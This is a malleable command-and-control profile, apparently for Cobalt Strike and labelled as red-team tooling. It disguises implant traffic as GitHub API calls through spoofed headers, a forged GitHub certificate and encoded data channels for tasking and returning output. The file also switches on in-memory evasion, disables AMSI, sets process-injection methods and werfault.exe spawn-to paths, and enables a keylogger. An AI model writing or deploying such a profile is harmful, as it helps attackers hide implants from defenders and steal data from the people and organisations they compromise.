# =====================================================================
# Profile: GitHub REST API v3 - STEALTH
# Generated & Validated by Ostad Red Team Forge Malleable C2 Engine
# Founder & Director: Ostad Rezaul Karim (Top 1% Red Teamer)
# =====================================================================

set sample_name "update_i43lOR.exe";
set sleeptime "5000";
set jitter "25";
set maxget "1048576";
set data_jitter "27";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.2478.80";
set pipename "spoolss_##";
set pipename_stager "status_0e5Z##";


http-get {
    set uri "/rate_limit" "/user/notifications";

    client {
        header "Host" "api.github.com";
        header "Accept" "application/vnd.github.v3+json";
        header "Accept-Language" "en-US,en;q=0.9";
        header "X-GitHub-Media-Type" "github.v3; format=json";
        metadata {
            mask;
            base64url;
            prepend "token=";
            header "Cookie";
        }
    }

    server {
        header "Server" "GitHub.com";
        header "Content-Type" "application/json";
        header "Cache-Control" "no-cache, no-store, must-revalidate";
        output {
            mask;
            base64;
            print;
        }
    }
}

http-post {
    set uri "/repos/octocat/Hello-World/dispatches" "/collector/activity";
    set verb "POST";

    client {
        header "Host" "api.github.com";
        header "Accept-Language" "en-US,en;q=0.9";
        header "X-GitHub-Media-Type" "github.v3; format=json";
        header "Content-Type" "application/json";
        id {
            mask;
            base64url;
            parameter "token";
        }
        output {
            mask;
            base64url;
            print;
        }
    }

    server {
        header "Server" "GitHub.com";
        header "Content-Type" "application/json";
        output {
            mask;
            base64;
            print;
        }
    }
}

stage {
    set checksum "0";
    set cleanup "true";
    set sleep_mask "true";
    set smartinject "true";
    set stomppe "true";
    set obfuscate "true";
    set userwx "false";
    set magic_mz_x86 "MZMY";
    set magic_mz_x64 "MZMY";
    set magic_pe "PL";
    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    }
}

process-inject {
    set allocator "VirtualAllocEx";
    set min_alloc "8192";
    set startrwx "false";
    set userwx "false";
    execute {
        CreateThread;
        SetThreadContext;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

post-ex {
    set spawnto_x86 "%windir%\syswow64\werfault.exe";
    set spawnto_x64 "%windir%\sysnative\werfault.exe";
    set amsi_disable "true";
    set keylogger "GetAsyncKeyState";
}

https-certificate {
    set CN "*.github.com";
    set O "GitHub, Inc.";
    set OU "Production Operations";
    set C "US";
    set ST "California";
    set L "San Francisco";
    set validity "448";
}
